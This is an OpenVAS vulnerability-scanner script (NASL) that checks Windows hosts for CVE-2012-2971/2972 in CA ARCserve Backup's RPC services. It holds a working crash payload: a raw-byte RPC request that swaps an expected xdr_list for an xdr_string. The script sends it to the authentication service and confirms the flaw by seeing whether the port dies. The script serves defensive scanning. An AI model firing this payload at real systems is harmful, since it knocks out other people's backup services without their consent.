###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ca_arcserve_backup_rpc_services_mult_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# CA ARCserve Backup RPC Services Multiple Vulnerabilities (Windows)
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will remote attackers to execute arbitrary code or
  cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "CA ARCserve Backup for Windows r12.5, r15, r16";
tag_insight = "The flaws are due to an error in the RPC service, which fails to validate
  user supplied crafted input.";
tag_solution = "Apply the patch from below link,
  https://support.ca.com/irj/portal/anonymous/phpsupcontent?contentID={F9EEA31E-8089-423E-B746-41B5C9DD2AC1}";
tag_summary = "This host is installed with CA ARCserve Backup and is prone
  multiple vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802677");
  script_version("$Revision: 9352 $");
  script_cve_id("CVE-2012-2971", "CVE-2012-2972");
  script_bugtraq_id(56116);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-11-20 11:04:50 +0530 (Tue, 20 Nov 2012)");
  script_name("CA ARCserve Backup RPC Services Multiple Vulnerabilities (Windows)");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51012/");
  script_xref(name : "URL" , value : "http://www.offensive-security.com/vulndev/ca-arcserve-rwslist-remote-code-execution/");
  script_xref(name : "URL" , value : "https://support.ca.com/irj/portal/anonymous/phpsupcontent?contentID={F9EEA31E-8089-423E-B746-41B5C9DD2AC1}");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("secpod_rpc_portmap.nasl", "os_detection.nasl");
  script_require_keys("rpc/portmap");
  script_mandatory_keys("Host/runs_windows");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("byte_func.inc");

## variable initialization
port = 0;
soc = "";
res = "";
dos = "";
soc2 = "";
soc3 = "";
req_getport = "";

RPC_PROG = "100000";

## get the rpc port, running portmap service
port = get_rpc_port(program: RPC_PROG, protocol: IPPROTO_TCP);

## check rpc port
if(port)
{
  ## authentication service port request
  req_getport = raw_string(
  0x80, 0x00, 0x00, 0x38, 0x4f, 0x9d, 0xb4, 0xb2, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x86, 0xa0, 0x00, 0x00, 0x00, 0x02,
  0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x09, 0x80,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00);

  ## open rpc port socket
  soc = open_sock_tcp(port);

  ## send the request and get the authentication service port
  send(socket:soc, data:req_getport);
  res = recv(socket:soc, length:100);
  close(soc);

  ## if no response exit
  if(res == NULL){
    exit(0);
  }

  ## get the response length
  reslen = strlen(res);

  ## extract authentication service port number
  authport = hex2dec(xvalue:hexstr(res[reslen-2])+hexstr(res[reslen-1]));

  ## dos request
  dos = raw_string(
  0x80, 0x00, 0x02, 0x68, 0x4f, 0x9d, 0x17, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x02, 0x00, 0x06, 0x09, 0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
  0x00, 0x7a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa1, 0x02, 0x35, 0x32, 0x35,
  0x34, 0x30, 0x30, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x41,
  0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x30, 0x30, 0x30, 0x30, 0x30,
  0x30, 0x31) +  crap(data:raw_string(0x30), length:98) + raw_string(
  0x34, 0x45, 0x38, 0x44, 0x44, 0x31, 0x36, 0x34, 0x44, 0x33, 0x41, 0x37, 0x31,
  0x42, 0x39, 0x43, 0x36, 0x46, 0x34, 0x43, 0x46, 0x42, 0x41, 0x42, 0x34, 0x32,
  0x35, 0x35, 0x42, 0x44, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb1, 0x02,
  0x35, 0x32, 0x35, 0x34, 0x30, 0x30, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30,
  0x30, 0x30, 0x41, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x30, 0x30,
  0x30, 0x30, 0x30, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30) +
  crap(data:raw_string(0x30), length:89) + raw_string (
  0x46, 0x30, 0x38, 0x30, 0x31, 0x43, 0x42, 0x41, 0x37, 0x38, 0x37, 0x36, 0x44,
  0x46, 0x30, 0x45, 0x44, 0x41, 0x44, 0x31, 0x36, 0x44, 0x43, 0x38, 0x36, 0x36,
  0x38, 0x39, 0x37, 0x33, 0x43, 0x31, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
  0x41, 0x41, 0x41,
  ## xdr_list was expected here, we replace it with
  ## an xdr_string to trigger the bug
  0x00, 0x00, 0x00, 0x06, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x00,
  ## string
  0x00, 0x00, 0x00, 0x17, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
  0x41, 0x00);

  ## open socket for authentication service
  soc2 = open_sock_tcp(authport);

  if(soc2)
  {
    ## send the dos attack request
    send(socket:soc2, data:dos);
    res = recv(socket:soc2, length:100);
    close(soc2);

    ## wait for port dead
    sleep(15);

    ## open socket after the attack
    soc3 = open_sock_tcp(authport);

    ## check port is alive or not
    if(!soc3)
    {
      security_message(port:port, protocol:"tcp");
      exit(0);
    }
    close(soc3);
  }
}
